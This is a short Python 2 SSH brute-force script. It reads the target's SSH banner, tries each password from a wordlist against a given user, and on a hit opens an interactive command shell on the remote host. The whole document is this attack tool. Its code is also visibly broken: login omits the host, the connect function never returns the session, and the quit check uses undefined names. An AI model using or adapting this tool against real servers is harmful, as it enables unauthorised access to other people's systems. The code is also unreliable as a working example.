##author--------siditrix---------

import socket
import pxssh
import argparse
import time
 

def connect(host,user,password):
 fails=0
 try:
	s=pxssh.pxssh()
	s.login(user,password)
	print'----password found!!------'
	print password
 except Exception,e:
	if fails>5:
		print'connection overload!!..'
	elif 'read nonblocking' in str(e):
		fails +=1
		time.sleep(3)
		return connect(host,user,password)
	elif 'synchronize with original prompt' in str(e):
		time.sleep(2)
		return connect(host,user,password)
	return None

def sshconnect(host):
 s=socket.socket()
 port=22
 s.connect((host,port))
 banner= s.recv(1024)
 print'--------------------------------------------------'
 print banner
 print'----------------------------------------------'

def main():
 
 parser = argparse.ArgumentParser()
 parser.add_argument("host",help="specify host name..")
 parser.add_argument("user",help="specify user name..")
 parser.add_argument("file",help="specify psssword file")
 args=parser.parse_args()
 
 sshconnect(args.host)
 
 if args.host and args.user and args.file:
	with open(args.file,'r') as infile:
		for line in infile:
			password= line.strip('\r\n')
			print'siditrix testing ------> '	+ str(password)
			con= connect(args.host,args.user,password)
			if  con:
				print'=------boooooooooooooom-------------'
				print'[got ssh] connection enter command or q to quit..'
				command=raw_input('>')
				while command !=q and command != Q:
					con.sendline(command)
					con.prompt()
					print con.before
					command= raw_input('>')
 else:
	print parser.usage
	exit(0)

if __name__=='__main__':
	main()
